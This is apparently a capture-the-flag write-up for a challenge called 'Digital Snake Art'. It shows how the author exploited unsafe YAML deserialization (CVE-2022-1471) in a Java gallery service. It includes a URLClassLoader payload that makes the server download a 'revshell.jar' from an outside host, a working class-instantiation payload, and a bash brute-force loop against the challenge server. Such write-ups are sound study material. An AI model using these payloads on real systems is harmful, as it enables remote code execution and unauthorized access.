# Digital Snake Art

## Challenge
I'm a big fan of digital art!

How do you like my new gallery?

http://ch.hackyeaster.com:2307

Note: The service is restarted every hour at x:00.

<img width="300" alt="image" src="https://user-images.githubusercontent.com/2973929/234147383-1a18a1b5-4a08-446c-804c-c7e652d646b8.png">

<img width="554" alt="image" src="https://user-images.githubusercontent.com/2973929/234147408-ad940e01-05c4-4ba9-80a2-9470a1d87b56.png">

## Solution

This one took me a full day to complete.

First, the payload for a "normal" request:

```
echo -n "bmFtZTogU25ha2VzIGF0IHRoZSBCZWFjaAppbWFnZTogc25ha2VzX2F0X3RoZV9iZWFjaApzb3VyY2U6IERBTEwtRQpyZXNvbHV0aW9uOiAyNTZ4MjU2"| base64 -d
name: Snakes at the Beach
image: snakes_at_the_beach
source: DALL-E
resolution: 256x256
```

It's a YAML with the info. I suspected I could inject some file name in `image:` like /flag.txt and be happy, but that was definitely not the case. 
After googling a lot I came to know about [CVE-2022-1471](https://nvd.nist.gov/vuln/detail/CVE-2022-1471) and I quickly found some [PoCs](https://github.com/artsploit/yaml-payload/) promising RCEs and reverse shells using javax.net.URLClassLoader, which (for what I could make of it) should let you load an external Class by URL. 
I spent all my day trying to achieve that, and although I could get the server to download my malicious .jar files, I never got it to run them, and oh boy, I tried.
The payload I used to make the server download my exploit was:

```yaml
name: Snakes at the Beach
image: snakes_at_the_beach
source: DALL-E
resolution: !!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL ["http://myserver/revshell.jar"]  ]]]
```
I've tried jars to `ping`, `echo > /dev/tcp/` and a lot of other things, but the application _NEVER_ ran my code. I have no idea why.

It took my a while to find out that the source code for the application was available, and although I'm no Java Programmer, I still know how to read. 

There's a `Flag` class
```java
package com.hackyeaster.digitalsnakeart;

public class Flag extends Image {

    public Flag(Code code) {
        if (code.isCorrect()) {
            this.base64String = SnakeService.loadFlag();
        } else {
            this.base64String = SnakeService.load("snake_no_access");
        }
    }
}
```

that extends `Image`
```java
package com.hackyeaster.digitalsnakeart;

public class Image {

    protected String base64String;

    public String getBase64String() {
        if (base64String == null) {
            return SnakeService.load("fail");
        }
        return base64String;
    }

    protected Image() {
    }

    public Image(String name) {
        this.base64String = SnakeService.load(name);
    }
}
```

I had to read more to understand the Code object (is it an object or a class? both? sorry idk) in Code.java
```java
package com.hackyeaster.digitalsnakeart;

public class Code {

    private final short code;

    public Code(short code) {
        this.code = code;
    }

    public boolean isCorrect() {
        return (code > 0 && code < 500 && code == SnakeService.getSecretCode());
    }

}
```
and that `isCorrect()` method (is it a method? I don't know java) is definitely inviting me to brute force something.

So I thought:
"Damn it. If I should be able to use that exploit to load external classes from an URL, how in hell wouldn't I be able to call classes, methods and objects ALREADY THERE?"
Gathering everything, it was clear to me that I should try to inject the `image:` key.
Judging by the cover, I supposed it should start with something like `!!com.hackyeaster.digitalsnakeart.Flag [ ]`, so I started literally manually brute forcing words, positions, brackets, for hours! Until I got it right:

```yaml
name: Snakes at the Beach
image: !!com.hackyeaster.digitalsnakeart.Flag [ !!com.hackyeaster.digitalsnakeart.Code [ CODE ] ]
source: DALL-E
resolution: 256x256'
```

First thing I did was to craft a payload with a random code:
```bash
payload='name: Snakes at the Beach
image: !!com.hackyeaster.digitalsnakeart.Flag [ !!com.hackyeaster.digitalsnakeart.Code [ 30 ] ]
source: DALL-E
resolution: 256x256'

p=$(echo "$payload" | base64 -w0)
echo http://ch.hackyeaster.com:2307/art?art=$p
```
<img width="548" alt="image" src="https://user-images.githubusercontent.com/2973929/234149549-8df39d96-b204-4ce8-b565-9066d96bff09.png">


BAM! Different image! A snake with a lock!
After tyring other codes, I was sure that every time I got the code wrong I would see that image. So I got its md5 and wrote a shell script to test every code from 1 to 499:

```bash
#!/bin/bash
#
payload='name: Snakes at the Beach
image: !!com.hackyeaster.digitalsnakeart.Flag [ !!com.hackyeaster.digitalsnakeart.Code [ CODE ] ]
source: DALL-E
resolution: 256x256'


for i in {1..499}; do
        p=$(sed "s/CODE/$i/g" <<< "$payload")
        p=$(echo "$p" | base64 -w0)
        echo "tentando code=$i"
        curl -s "http://ch.hackyeaster.com:2307/art?art=$p" | grep -Eo "iVBOR[^\"]+" |base64 -d > out$i.png
        md5=($(md5sum out$i.png))
        [ "${md5[0]}" != "978e633da503b6de81d1fa44fce2f462" ] && {
                echo $i encontrado;
                echo "http://ch.hackyeaster.com:2307/art?art=$p"
                exit
        } || {
                echo "md5 de $i é $md5, igual a 978e633da503b6de81d1fa44fce2f462"
                rm out$i.png
        }
done
```

Then I just ran it. When I got the right code, I clicked the link and saw that there was an egg with a QR code.

<img width="550" alt="image" src="https://user-images.githubusercontent.com/2973929/234149975-bb05bf0a-82f9-4a97-962f-0dcb60e812e9.png">

As my script kept the right file, i checked it with `zbarimg`:

<img width="869" alt="image" src="https://user-images.githubusercontent.com/2973929/234149796-281ca722-39b1-416b-a1c0-5269802a2588.png">




